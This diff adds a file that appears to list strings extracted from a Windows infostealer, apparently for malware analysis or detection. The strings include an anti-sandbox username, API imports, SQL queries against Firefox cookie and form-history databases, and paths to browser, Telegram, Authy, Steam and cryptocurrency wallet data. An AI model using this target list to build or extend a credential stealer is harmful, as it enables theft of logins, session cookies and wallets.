@@ -1,0 +1,182 @@
+JohnDoe
+LoadLibraryA
+lstrcatA
+GetProcAddress
+Sleep
+GetSystemTime
+ExitProcess
+GetCurrentProcess
+VirtualAllocExNuma
+VirtualAlloc
+VirtualFree
+lstrcmpiW
+LocalAlloc
+GetComputerNameA
+advapi32.dll
+GetUserNameA
+kernel32.dll
+Wallets
+Plugins
+keystore
+GetCurrentHwProfileA
+wininet.dll
+InternetCloseHandle
+InternetReadFile
+HttpSendRequestA
+HttpOpenRequestA
+InternetConnectA
+InternetOpenA
+HttpAddRequestHeadersA
+HttpQueryInfoA
+InternetSetFilePointer
+InternetOpenUrlA
+InternetSetOptionA
+DeleteUrlCacheEntry
+CreateCompatibleBitmap
+SelectObject
+BitBlt
+DeleteObject
+CreateDCA
+GetDeviceCaps
+CreateCompatibleDC
+CoCreateInstance
+CoUninitialize
+GetDesktopWindow
+ReleaseDC
+GetKeyboardLayoutList
+CharToOemA
+GetDC
+wsprintfA
+GetEnvironmentVariableA
+SetEnvironmentVariableA
+GetTickCount
+OpenEventA
+CreateEventA
+CreateToolhelp32Snapshot
+Process32First
+Process32Next
+GetWindowsDirectoryA
+GetVolumeInformationA
+shell32.dll
+shlwapi.dll
+dbghelp.dll
+gdiplus.dll
+CryptBinaryToStringA
+RegEnumValueA
+GetFileSecurityA
+OpenProcessToken
+DuplicateToken
+MapGenericMask
+AccessCheck
+InternetCrackUrlA
+CoInitialize
+CreateStreamOnHGlobal
+GetHGlobalFromStream
+GetWindowRect
+GetWindowDC
+CloseWindow
+ShellExecuteExA
+SHFileOperationA
+SHGetFolderPathA
+PathMatchSpecW
+PathMatchSpecA
+StrCmpCA
+StrCmpCW
+StrStrA
+PathFindFileNameA
+SymMatchString
+GdipGetImageEncodersSize
+GdipGetImageEncoders
+GdipCreateBitmapFromHBITMAP
+GdiplusStartup
+GdiplusShutdown
+GdipSaveImageToStream
+GdipDisposeImage
+GdipFree
+sqlite3_open
+sqlite3_prepare_v2
+sqlite3_step
+sqlite3_column_text
+sqlite3_finalize
+sqlite3_close
+sqlite3_column_bytes
+sqlite3_column_blob
+\\Opera Software\\
+\\Opera Stable\\
+\\Opera GX Stable\\
+\\CryptoTab Browser\\User Data\\
+CryptoTab Browser
+\\BraveSoftware\\Brave-Browser\\User Data\\
+Brave
+\\Thunderbird\\Profiles\\
+Thunderbird
+\\Telegram Desktop\\
+key_datas
+map*
+D877F783D5D3EF8C*
+A7FDF864FBC10B77*
+A92DAA6EA6F891F2*
+F8806DD0C461824F*
+\\Soft\\Telegram\\
+\\passwords.txt
+\\\os_crypt\\\:{\\\encrypted_key\\\:\\\
+Soft: 
+Host: 
+Login: 
+Password: 
+Network
+SELECT host, isHttpOnly, path, isSecure, expiry, name, value FROM moz_cookies
+SELECT url FROM moz_places
+SELECT fieldname, value FROM moz_formhistory
+History
+cookies.sqlite
+formhistory.sqlite
+places.sqlite
+*.localstorage
+\\Authy Desktop\\Local Storage\\
+\\Soft\\Authy Desktop Old\\
+\\Authy Desktop\\Local Storage\\leveldb\\
+CPU Count: 
+RAM: 
+VideoCard: 
+[Processes]
+[Software]
+\\information.txt
+%APPDATA%
+%LOCALAPPDATA%
+%USERPROFILE%
+%DESKTOP%
+%DOCUMENTS%
+%PROGRAMFILES%
+%PROGRAMFILES_86%
+%RECENT%
+%DRIVE_FIXED%
+%DRIVE_REMOVABLE%
+*%RECENT%*
+*%DRIVE_FIXED%*
+*%DRIVE_REMOVABLE%*
+C:\\Windows\\
+C:\\\\Windows\\
+C:\\\\\\Windows\\
+Software\\Valve\\Steam
+SteamPath
+ssfn*
+config.vdf
+DialogConfig.vdf
+DialogConfigOverlay*.vdf
+libraryfolders.vdf
+loginusers.vdf
+Binance Desktop
+simple-storage.json
+.finger-print.fp
+Bitcoin Core
+\\Bitcoin\\wallets\\
+Bitcoin Core Old
+\\Bitcoin\\
+wallet.dat
+*wallet*.dat
+Dogecoin
+\\Dogecoin\\
+Raven Core
+\\Raven\\
+Ledger Live
